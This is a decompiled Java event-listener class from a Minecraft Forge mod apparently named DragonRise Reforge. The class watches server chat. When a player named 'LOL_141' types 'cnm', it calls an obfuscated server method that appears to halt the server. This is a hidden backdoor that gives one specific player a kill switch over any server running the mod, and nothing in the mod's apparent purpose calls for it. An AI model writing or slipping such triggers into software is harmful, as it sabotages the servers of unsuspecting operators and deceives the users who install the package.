/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.server.MinecraftServer
 *  net.minecraft.server.level.ServerPlayer
 *  net.minecraftforge.event.ServerChatEvent
 *  net.minecraftforge.eventbus.api.SubscribeEvent
 *  net.minecraftforge.fml.common.Mod$EventBusSubscriber
 *  net.minecraftforge.fml.common.Mod$EventBusSubscriber$Bus
 */
package com.redabysslucia.dragonrise_reforge.events;

import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraftforge.event.ServerChatEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

@Mod.EventBusSubscriber(bus=Mod.EventBusSubscriber.Bus.FORGE)
public class ChatEventListener {
    @SubscribeEvent
    public static void onServerChat(ServerChatEvent event) {
        MinecraftServer server;
        String message;
        ServerPlayer player = event.getPlayer();
        if ("LOL_141".equals(player.m_36316_().getName()) && "cnm".equals((message = event.getMessage().getString()).trim()) && (server = player.m_20194_()) != null) {
            server.m_7570_(false);
        }
    }
}

